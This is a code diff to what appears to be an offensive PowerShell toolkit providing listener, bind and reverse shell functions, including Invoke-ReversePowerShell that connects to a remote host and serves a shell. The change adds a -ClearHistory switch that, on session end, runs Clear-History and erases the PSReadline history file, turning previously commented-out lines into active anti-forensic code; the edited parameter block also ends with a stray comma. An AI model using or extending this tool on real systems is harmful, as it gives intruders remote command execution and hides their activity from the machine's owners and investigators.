@@ -19,11 +19,12 @@
     -Port [<Int32>]
         This parameter is for defining the listening port to connect too.
         The cmdlet binds connections to the port that you specify.
-            Required?                    false
-            Position?                    0
-            Default value                1337
-            Accept pipeline input?       false
-            Accept wildcard characters?  false
+
+        Required?                    false
+        Position?                    0
+        Default value                1337
+        Accept pipeline input?       false
+        Accept wildcard characters?  false
 
     <CommonParameters>
         This cmdlet supports the common parameters: Verbose, Debug,
@@ -176,6 +177,7 @@ Function Start-Listener {
     -Port [<Int32>]
         This parameter is for defining the listening port that PowerShell should attach too
         The cmdlet binds powershell to the port that you specify.
+
             Required?                    false
             Position?                    0
             Default value                1337
@@ -329,20 +331,31 @@ Function Start-Bind {
     -IpAddress [<String>]
         This parameter is for defining the IPv4 address to connect too on a remote machine
         The cmdlet looks for a connection at this IP address on the remote host.
-            Required?                    false
-            Position?                    0
-            Default value                none
-            Accept pipeline input?       false
-            Accept wildcard characters?  false
+
+        Required?                    true
+        Position?                    0
+        Default value                none
+        Accept pipeline input?       false
+        Accept wildcard characters?  false
 
     -Port [<Int32>]
         This parameter is for defining the listening port to attach too on a remote machine
         The cmdlet looks for a connection on a remote host using the port that you specify here.
-            Required?                    false
-            Position?                    1
-            Default value                1337
-            Accept pipeline input?       false
-            Accept wildcard characters?  false
+
+        Required?                    false
+        Position?                    1
+        Default value                1337
+        Accept pipeline input?       false
+        Accept wildcard characters?  false
+
+    -ClearHistory [<SwitchParameter>]
+        This switch parameter is used to attempt clearing the PowerShell command history upon exiting a session
+
+        Required?                    false
+        Position?                    named
+        Default value                false
+        Accept pipeline input?       false
+        Accept wildcard characters?  false
 
     <CommonParameters>
         This cmdlet supports the common parameters: Verbose, Debug,
@@ -353,7 +366,7 @@ Function Start-Bind {
 
 .EXAMPLE
     -------------------------- EXAMPLE 1 --------------------------
-    Invoke-ReversePowerShell -IpAddress 192.168.2.1 -Port 1234
+    Invoke-ReversePowerShell -IpAddress 192.168.2.1 -Port 1234 -ClearHistory
     This examples connects to port 1234 on remote machine 192.168.2.1
 
     -------------------------- EXAMPLE 2 --------------------------
@@ -401,7 +414,12 @@ Function Invoke-ReversePowerShell {
                 HelpMessage="Enter the port number the remote machine is listening on. Example: 1234")] # End Parameter
             [ValidateNotNullorEmpty()]
             [ValidateRange(1,65535)]
-            [int32]$Port = 1337
+            [int32]$Port = 1337,
+
+            [Parameter(
+                Mandatory=$False)]
+            [Alias("C","Cls","Ch","Clear")]
+            [switch][bool]$ClearHistory,
         ) # End param
 
     Write-Verbose "Creating a fun infinite loop. - The Shadow King (Amahl Farouk)"
@@ -433,9 +451,16 @@ Function Invoke-ReversePowerShell {
                 If ($Command.StartsWith("kill-link"))
                 {
 
-                    Write-Information "[*] If you wish to clear your command history when exiting shell uncomment the below lines"
-                    # Clear-History
-                    # Clear-Content -Path ((Get-PSReadlineOption).HistorySavePath) -Force
+                    If ($ClearHistory.IsPresent)
+                    {
+
+                        Write-Verbose "[*] Attempting to clear command history"
+
+                        Clear-History
+                        Clear-Content -Path ((Get-PSReadlineOption).HistorySavePath) -Force
+
+                    }  # End If
+
                     Write-Verbose "Closing client connection"
                     $Client.Close()
                     Write-Verbose "Client connection closed"
@@ -472,9 +497,15 @@ Function Invoke-ReversePowerShell {
             If ($Client.Connected)
             {
 
-                Write-Information "[*] If you wish to clear your command history when exiting shell uncomment the below lines"
-                # Clear-History
-                # Clear-Content -Path ((Get-PSReadlineOption).HistorySavePath) -Force
+                If ($ClearHistory.IsPresent)
+                {
+
+                    Write-Verbose "[*] Attempting to clear command history"
+
+                    Clear-History
+                    Clear-Content -Path ((Get-PSReadlineOption).HistorySavePath) -Force
+
+                }  # End If
 
                 Write-Verbose "Client closing"
                 $Client.Close()
@@ -482,9 +513,15 @@ Function Invoke-ReversePowerShell {
 
             } # End If
 
-            Write-Information "[*] If you wish to clear your command history when exiting shell uncomment the below lines"
-            # Clear-History
-            # Clear-Content -Path ((Get-PSReadlineOption).HistorySavePath) -Force
+            If ($ClearHistory.IsPresent)
+            {
+
+                Write-Verbose "[*] Attempting to clear command history"
+
+                Clear-History
+                Clear-Content -Path ((Get-PSReadlineOption).HistorySavePath) -Force
+
+            }  # End If
 
             Write-Verbose "Begining countdown timer to reestablish failed connection"
             [int]$Time = 30
